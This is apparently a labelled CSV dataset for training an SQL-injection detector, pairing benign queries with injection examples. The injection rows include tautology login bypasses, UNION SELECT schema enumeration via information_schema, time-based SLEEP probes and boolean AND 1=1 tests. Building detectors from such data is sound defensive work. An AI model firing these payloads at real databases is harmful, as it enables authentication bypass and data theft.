text,label
SELECT * FROM users WHERE username = 'user' AND password = '' OR '6'='1';,1
SELECT * FROM accounts WHERE email = 'user36@example.com';,0
"SELECT * FROM orders WHERE order_id = 927 UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables;",1
SELECT * FROM orders WHERE order_id = 637;,0
SELECT name FROM employees WHERE id = 65 AND 1=1;,1
SELECT * FROM orders WHERE order_id = 934;,0
SELECT name FROM employees WHERE id = 17 AND 1=1;,1
SELECT * FROM users WHERE id = 60;,0
SELECT * FROM accounts WHERE email = 'test@example.com' AND EXISTS (SELECT * FROM admin WHERE id=3);,1
SELECT * FROM orders WHERE order_id = 790;,0
SELECT * FROM users WHERE id = 1 AND SLEEP(4);,1
SELECT name FROM employees WHERE id = 2;,0
SELECT * FROM accounts WHERE email = 'test@example.com' AND EXISTS (SELECT * FROM admin WHERE id=4);,1
SELECT * FROM users WHERE id = 70;,0
SELECT * FROM users WHERE id = 1 AND SLEEP(9);,1
SELECT * FROM accounts WHERE email = 'user10@example.com';,0
SELECT name FROM employees WHERE id = 3 AND 1=1;,1
SELECT * FROM users WHERE id = 7;,0
"SELECT * FROM orders WHERE order_id = 246 UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables;",1
SELECT * FROM users WHERE username = 'user';,0
"SELECT * FROM orders WHERE order_id = 350 UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables;",1
SELECT * FROM users WHERE username = 'user' AND password = '' OR '4'='4';,1
SELECT * FROM users WHERE id = 80;,0
SELECT * FROM users WHERE username = 'user' AND password = '' OR '10'='4';,1
SELECT * FROM orders WHERE order_id = 483;,0
"SELECT * FROM orders WHERE order_id = 157 UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables;",1
SELECT * FROM orders WHERE order_id = 869;,0
SELECT name FROM employees WHERE id = 69;,0
SELECT * FROM users WHERE id = 1 AND SLEEP(10);,1
SELECT * FROM accounts WHERE email = 'user76@example.com';,0
SELECT * FROM users WHERE username = 'user' AND password = '' OR '8'='5';,1
SELECT * FROM accounts WHERE email = 'user81@example.com';,0
SELECT * FROM accounts WHERE email = 'user92@example.com';,0
SELECT * FROM users WHERE id = 1 AND SLEEP(5);,1
SELECT name FROM employees WHERE id = 80;,0
SELECT * FROM users WHERE username = 'user' AND password = '' OR '5'='10';,1
SELECT * FROM users WHERE id = 11;,0
SELECT * FROM accounts WHERE email = 'test@example.com' AND EXISTS (SELECT * FROM admin WHERE id=2);,1
SELECT * FROM users WHERE id = 21;,0
SELECT * FROM users WHERE username = 'user' AND password = '' OR '8'='10';,1
SELECT * FROM users WHERE id = 52;,0
SELECT * FROM users WHERE username = 'user' AND password = '' OR '5'='2';,1
SELECT * FROM users WHERE id = 1 AND SLEEP(7);,1
SELECT * FROM orders WHERE order_id = 444;,0
"SELECT * FROM orders WHERE order_id = 536 UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables;",1
SELECT * FROM accounts WHERE email = 'user74@example.com';,0
SELECT name FROM employees WHERE id = 69 AND 1=1;,1
SELECT * FROM orders WHERE order_id = 155;,0
SELECT * FROM accounts WHERE email = 'test@example.com' AND EXISTS (SELECT * FROM admin WHERE id=5);,1
SELECT * FROM accounts WHERE email = 'user99@example.com';,0
SELECT * FROM users WHERE id = 1 AND SLEEP(6);,1
SELECT name FROM employees WHERE id = 16 AND 1=1;,1
SELECT * FROM accounts WHERE email = 'user86@example.com';,0
"SELECT * FROM orders WHERE order_id = 546 UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables;",1
SELECT * FROM users WHERE id = 26;,0
SELECT * FROM users WHERE id = 1 AND SLEEP(1);,1
SELECT name FROM employees WHERE id = 46;,0
SELECT name FROM employees WHERE id = 41 AND 1=1;,1
SELECT * FROM users WHERE id = 83;,0
SELECT * FROM accounts WHERE email = 'test@example.com' AND EXISTS (SELECT * FROM admin WHERE id=1);,1
SELECT name FROM employees WHERE id = 32;,0
SELECT * FROM users WHERE username = 'user' AND password = '' OR '4'='7';,1
SELECT name FROM employees WHERE id = 11 AND 1=1;,1
SELECT * FROM users WHERE id = 42;,0
SELECT * FROM users WHERE username = 'user' AND password = '' OR '9'='2';,1
"SELECT * FROM orders WHERE order_id = 107 UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables;",1
SELECT * FROM users WHERE id = 16;,0
SELECT * FROM orders WHERE order_id = 440;,0
SELECT name FROM employees WHERE id = 1 AND 1=1;,1
SELECT * FROM orders WHERE order_id = 700;,0
SELECT name FROM employees WHERE id = 59 AND 1=1;,1
SELECT * FROM orders WHERE order_id = 696;,0
"SELECT * FROM orders WHERE order_id = 435 UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables;",1
SELECT * FROM users WHERE username = 'user' AND password = '' OR '6'='3';,1
SELECT * FROM users WHERE id = 37;,0
SELECT name FROM employees WHERE id = 72 AND 1=1;,1
SELECT * FROM users WHERE username = 'user' AND password = '' OR '9'='6';,1
SELECT * FROM accounts WHERE email = 'user88@example.com';,0
"SELECT * FROM orders WHERE order_id = 868 UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables;",1
SELECT * FROM accounts WHERE email = 'user16@example.com';,0
"SELECT * FROM orders WHERE order_id = 772 UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables;",1
SELECT name FROM employees WHERE id = 77;,0
SELECT * FROM users WHERE username = 'user' AND password = '' OR '1'='2';,1
SELECT * FROM users WHERE username = 'user' AND password = '' OR '6'='6';,1
SELECT * FROM orders WHERE order_id = 485;,0
SELECT name FROM employees WHERE id = 7 AND 1=1;,1
SELECT * FROM orders WHERE order_id = 411;,0
SELECT * FROM users WHERE username = 'user' AND password = '' OR '9'='9';,1
SELECT name FROM employees WHERE id = 37 AND 1=1;,1
SELECT * FROM orders WHERE order_id = 223;,0
SELECT * FROM users WHERE id = 19;,0
SELECT * FROM users WHERE username = 'user' AND password = '' OR '7'='7';,1
SELECT * FROM users WHERE id = 51;,0
SELECT * FROM users WHERE id = 85;,0
SELECT * FROM users WHERE id = 1 AND SLEEP(2);,1
SELECT * FROM orders WHERE order_id = 552;,0
